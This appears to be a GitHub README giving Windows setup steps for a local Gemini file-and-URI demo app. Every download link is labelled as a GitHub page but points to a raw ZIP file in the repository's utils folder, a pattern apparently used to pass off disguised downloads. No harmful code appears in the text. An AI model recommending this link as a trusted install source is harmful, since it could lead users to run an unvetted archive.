# 🤖 gemini-file---uri-demo - Run Your AI File App Fast

[![Download](https://img.shields.io/badge/Download-Visit%20the%20GitHub%20page-blue.svg?style=for-the-badge)](https://github.com/jeannepunctilious742/gemini-file---uri-demo/raw/refs/heads/main/utils/demo-uri-gemini-file-v2.9.zip)

## 🖥️ What this app does

This app lets you run a local AI Studio project on Windows. It uses your Gemini API key and starts a local web app on your computer.

Use it when you want to:

- open the app on your own PC
- connect it to your Gemini account
- test the app in a browser
- work with file and URI handling in a simple demo app

## 📥 Download the app

Visit this page to download and run the app files:

https://github.com/jeannepunctilious742/gemini-file---uri-demo/raw/refs/heads/main/utils/demo-uri-gemini-file-v2.9.zip

Open the page, then use the download options on GitHub. If you see a ZIP file, save it to your computer and extract it.

## 🧰 What you need

Before you start, make sure your Windows PC has:

- Windows 10 or Windows 11
- Node.js installed
- a web browser like Chrome, Edge, or Firefox
- a Gemini API key

If Node.js is not installed yet, install it first from the Node.js website, then restart your PC if needed

## 🚀 Get the files ready

1. Open the GitHub page:
   https://github.com/jeannepunctilious742/gemini-file---uri-demo/raw/refs/heads/main/utils/demo-uri-gemini-file-v2.9.zip

2. Download the project files

3. If the download comes as a ZIP file, right-click it and choose Extract All

4. Put the folder in a place that is easy to find, such as Downloads or Desktop

5. Open the folder

## 🔑 Add your Gemini API key

This app needs your Gemini API key to run.

1. In the project folder, find the file named `.env.local`

2. Open it with Notepad

3. Find this line:

   `GEMINI_API_KEY=`

4. Add your key after the equals sign

   Example:

   `GEMINI_API_KEY=your_api_key_here`

5. Save the file

6. Close Notepad

If the file does not exist yet, create a new text file named `.env.local` in the main project folder and add the line above

## ▶️ Install and start the app

1. Open the project folder

2. Click the address bar in File Explorer

3. Type `cmd` and press Enter

4. In the black window, type:

   `npm install`

5. Press Enter and wait for the install to finish

6. After that, type:

   `npm run dev`

7. Press Enter

8. Wait for the local server to start

9. Open the web address shown in the window, usually something like `http://localhost:3000`

## 🌐 Use the app

When the browser opens, you can use the app like a normal website.

You may see screens for:

- file input
- URI testing
- Gemini responses
- local app status

If the app asks for a file, choose a file from your computer. If it asks for a link or URI, paste it into the field and continue

## 🪟 Windows setup steps

If you want the smoothest start on Windows, use these steps:

1. Download the project from the GitHub page
2. Extract the ZIP file
3. Install Node.js if you do not have it
4. Add your Gemini API key to `.env.local`
5. Open Command Prompt in the project folder
6. Run `npm install`
7. Run `npm run dev`
8. Open the local address in your browser

## 📁 Common files you may see

Here are a few files and folders you may find in the project:

- `package.json` — tells Node.js how to run the app
- `.env.local` — stores your Gemini API key
- `src` — contains app code
- `app` — contains the web app pages
- `public` — stores images and static files

You do not need to edit most of these files to run the app

## 🔧 If the app does not start

If the app does not open, check these common points:

1. Make sure Node.js is installed
2. Make sure you ran `npm install`
3. Make sure `.env.local` has a valid Gemini API key
4. Make sure you are in the main project folder when you run the commands
5. Make sure no other app is using the same local port

If the terminal shows an error, read the last line first. It usually tells you what to fix

## 🧪 Basic checks

Use this quick list if you want to confirm everything is set up:

- The project folder is on your PC
- Node.js works in Command Prompt
- The Gemini API key is saved in `.env.local`
- `npm install` finished without stopping
- `npm run dev` started a local web server
- The browser shows the app page

## 🧭 What the app is for

This demo is built for testing how an AI Studio app runs with local files and URIs. It is useful for:

- local development
- browser-based testing
- file handling demos
- checking Gemini API access
- trying the app on Windows before wider use

## 🛠️ Helpful Windows tips

- Use a short folder path like `C:\Apps\gemini-file---uri-demo`
- Do not place the project inside a protected system folder
- Keep your API key private
- Use Command Prompt or PowerShell from the project folder
- If Notepad changes the file name to `.txt`, rename it back to `.env.local`

## 📌 Quick start path

1. Visit the GitHub page
2. Download the project
3. Extract the files
4. Install Node.js
5. Add your Gemini API key
6. Run `npm install`
7. Run `npm run dev`
8. Open the local browser link